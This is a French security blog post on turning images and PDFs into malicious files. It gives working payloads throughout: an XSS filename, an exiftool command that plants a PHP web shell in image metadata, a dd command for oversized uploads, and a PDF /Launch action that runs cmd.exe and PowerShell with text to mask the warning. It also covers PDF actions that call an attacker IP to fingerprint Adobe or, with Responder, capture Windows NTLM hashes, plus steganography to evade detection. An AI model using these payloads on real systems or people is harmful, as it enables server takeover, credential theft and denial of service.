+++
date = "2020-04-26T13:37:00+00:00"
draft = false
tags = ['security']
title = "Armement de fichiers malicieux"
author = "claw"
+++


Dans cet article nous allons voire comment créer (ou modifier des fichiers légit
imes) afin de les rendre malicieux pour l'application web ou il sera uploader ou
 pour un victime (exemple d'une piece jointe dans email).


Des sample de fichiers infecté peuvent être téléchargés [ici](https://yourlabs.io/drClaw/infected_files).

### Images

Il existe princialment quatre principales facons de compromettre une image. A
noter que dans la majoritées des cas une image malveilante servira a compromettre
une application web (ou les utilisateur de celle ci)

- Son nom en lui même
- Ses matadonnées
- La steganographie
- Sa taille

##### Le nom de l'image

Si un attaquant peut uploader une image se nommant
`><img src=x onerror=alert(0)>.jpeg` **ET** que le nom de  l'image n'est pas renommer
par l'applicaion, il peut alors de produire une xss (cross-site scripting
(injection de javascript)).

Si le noms du fichier est inseré dans une base de données une injection sql peut
 également se produire (bien plus rare cependant)

Si les images ne sont pas renommées **et** quelle sont toutes uploadées dans le même dossiers, il sera alors possible de remplacer des images existantes.
Les images du sites telles que le logo, les illustrations etc ne sont généralement
 pas dans le même dossier que les "uploads" utilisateurs. Il sera donc possile
d'alterer uniquement les images des autres utilisateurs.


##### Les metadonnées

Une des attaques très connue est l'insertion de code dans metadonnées. Une simple
commande permet d'injecter du code et ainsi de créer une backdoor. Elle est
surtout utilisé dans la sites en php.

```bash
exiftool -Comment="<?php echo "<pre>"; system('$_GET[“cmd”]'); echo "</pre>";?>"
 evilfile.png
```

Une fois uplodée il suffit de faire une requette 'GET' avec firefox, elinks ou
même curl, sur l'url de l'image pour que la commande s'execute.

exemple:  `http://xxxxxxx.xxx/uploads/img/evilfile.png?cmd=ls`

Si le site est vulnerable, nous obtiendrons le resultats de la commande `ls` dans
une balise html "pre".

Dans de très rares cas (principalement en CTF) les metadonnées seront inserées
dans la base de données et peut donc provoquer une injection sql.


##### Stéganographie

La stéganographie consiste à cacher des données (code, image etc ..) dans un
 fichié sans altérer son apparence visuelle dans le cas d'une image.

Cette technique à pour principal objectif d'introduire du code malveillant dans
un systeme (le code cependant ne sera pas executé) ou a l'inverse d'exfiltrer des
données ...

Il y a plusieurs techniques pour stéganographier:

1) La plus simple mais aussi la plus detectable est d'ouvrir une image avec un editeur
de texte (vim, nano ...)  et d'ecrire **avant** le `<89>PNG^M` (1ere ligne) ou bien
à la fin après le `IEND®B<82>`. L'image ne sera pas alterée.

2) D'utiliser des outils tel que "steghide" qui ont pour avantage de pouvoir cacher
des fichiers entiers mais également de pouvoir les protéger avec un mot de passe,
et surtout d'être bien plus difficile à détecter.


##### La taille des fichiers

Si aucune verification n'est faite au niveau de l'header de l'image et de la
limite de taille un simple

```
dd if=/dev/zero of=big.jpg bs=1G count=20 status=progress
```

Si un attaquant se met à en uploader 20, 50 ou même 100, il peut se produire alors un
"Deni de service" ou "deni de service distribué" en saturant la bande passante
sur un instant T et/ou dans le temps en saturant l'éspace disque.
Si il y a une verification de l'header rien n'enpeche d'ouvrir un fichier png ou
jpeg valide et de coller des GB de texte a l'interieur.




### Les pdfs

/!\ Dans ce cas on utilisera adobe reader 9 (plus à jours) mais toujours utilisé dans de nombreuse socités utilisent encore cette version.

Une connaissance de la structure d'un pdf (object, xref table ...) est souhaité
pour compre le reste de l'article.

Le [blog](https://blog.didierstevens.com) de Didier stevens est une très bonne source
pour en apprendre plus sur les pdfs .

Cet [article](https://blog.didierstevens.com/2008/04/09/quickpost-about-the-physical-and-logical-structure-of-pdf-files/) explique très bien la structure des pdf.

Pour ce point la cible sera plutot un utilisateur et ca machine qu'une application web comme pour le point avec les images.

A noter que les techniques utilisées pour les images visant les application web marchent
 également avec un pdf.


##### Execution de Powershell

Des coomandes PowerShell peuvent être executer à partir d'un pdf.

```pdf
11 0 obj<<
    /Type
      /Action
        /S
          /Launch
            /Win <<
                /F (cmd.exe)
                  /P (/C start powershell.exe -Command "echo 'hello, this windows will be close in 10sec...'; sleep 10"


This document is encrypted
To view the encrypted content please tick the "Do not show this message again" box
and press Open.)
            >>
>>endobj
 ```

on utilise:

- `Action/S/Launch/Win`: pour spécifier quelle action on va lancer, ici,  lancer une commande sur windows
- `/F (cmd.exe)`: pour lancer cmd.exe
- `/P (/C start powershell.exe -Command "....."`: les arguments passés à cmd.exe
- `This document...` + les deux lignes vides: Pour masquer le message original
(bien que toujours visible si on scrolle vers le haut). ! Ne marche seulement sur adobe < 9.3.4


##### Javascript

Il est possible d'utiliser (dans une certaine mesure via l'api) du javascript dans
 un pdf. A noter que plus de 90 % des pdfs malicieux contiennent du js (et très
souvent associé à une `/A | /Action | /AA`).

Vous trouverez [ici](https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/js_api_reference.pdf) le manuel de l'api javascript pour adobe (plus de 750 pages... bon courage ^^) .


###### Adobe version

L'obtention de la version d'adobe utilisée est extremement utile pour un attaquant;
il lui permetera de chercher des exploits spécifiques à cette version et par ce fait
augmentera fortement les chances de réussite de l'attaque.

Pour obtenir la version, il faut faire une requette post vers un serveur que
l'attaquant controle. En utilisant wireshark ou tcpdump sur le serveur controlé,
il lui sera alors possible d'identifier la version grace à l'user agent :

![adobe_version](/img/adobe_version.png)


```pdf
/S /SubmitForm
/F
<<
/F (http://172.25.0.7:8080/test.php)
/FS /URL
```

explications:

- `/S /SubmitForm`: Le type d'action (dans ce cas /SubmitForm)

- `/F (http://172.25.0.7:8080/test.php)`: l'url de la forme

- `/FS /URL`: file spec dans ce cas `/URL`


** [!] Une popup apparait et la victime doit confirmer pour que le post soit fait et le message ne peut pas etre changé (warning + url) **


##### Vol d'username et de hash

En utilisant [responder.py](https://github.com/SpiderLabs/Responder), il est possible
de dérober l'username ainsi que le hash de la machine windows de la victime.

```pdt
/F (\\\\172.25.0.7\\test)
  /D [ 0 /Fit]
    /S /GoToR
```

On utilise ici `/GoToR` (go to remote) mais `/GoToE` (go to embed) marche aussi.

Avant de commencer l'attaque, il faut  lancer sur le serveur de l'attaquant responder :<br>

```sh
sudo responder -I <INTERFACE> -wF
```

Une fois que la victime ouvre le pdf (automatique et sans popup ou avertisement),
l'username ainsi que le hash de la victime apparait.<br>

![resp](/img/responder.png)

/!\ Exploit corrigé dans la version 9.1 de adobe

##### Stéganographie

Comme pour les images la stéganographie est possible dans un pdf.
Il y en revance plus de manières de dissimiler des données à l'interieur d'un pdf.

- En commentaire
- Dans un object non utilisé
- Stégé dans une image


<u>Commentaire:</u>

Pour commenter une ligne dans un pdf il suffit de commencer une ligne avec "%".

<u>Object on utilisé:</u>

Un attaquant peut cacher des données dans un objet qui n'est pas utilisé (generalement de type stream).
Les object de type stream (texte, images etc ...) sont le plus souvent encodé (Voir [l'article](https://blog.didierstevens.com/2008/05/19/pdf-stream-objects/) de Didier Stevens pour plus de details),
Il sera alors plus difficile à détécter qu'avec un simple commentaire.

<u>Stéganographié dans une image</u>

Comme les pdfs peuvent contenir des images, il est tout à fait possible d'utiliser la steganographie.

Exemple de comment extraire des données stéganographiées à l'aide de [steghide](http://steghide.sourceforge.net/) dans une image embarquée à l'interieur d'un pdf:

```bash
binwalk --dd='jpeg:jpg' pdf_steg.pdf
steghide extract -sf _pdf_steg_img_steg.pdf.extract/*jpg
#no password.. just press enter
```

Si le pdf contient beaucoup d'image cela sera difficilement détéctable. Il ne faut
pas hésiter à compresser un maximum les données stéganographiées afin d'être le moins détéctable posssible.

